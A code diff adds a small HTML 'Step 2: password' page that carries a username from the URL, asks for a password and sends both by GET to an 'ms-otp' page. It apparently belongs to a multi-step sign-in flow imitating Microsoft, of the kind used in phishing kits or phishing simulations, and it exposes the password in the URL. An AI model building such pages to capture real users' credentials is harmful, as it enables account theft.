@@ -1,0 +1,5 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><link rel="stylesheet" href="/style.css"><title>Step 2</title></head><body>
+<h1>Step 2: password</h1>
+<form action="/ms-otp.html" method="get"><input type="hidden" name="u" id="hu"><label for="p">Password</label><input id="p" name="p" type="password"><button>Continue</button></form>
+<script>document.getElementById("hu").value = new URLSearchParams(location.search).get("u") || "";</script>
+</body></html>
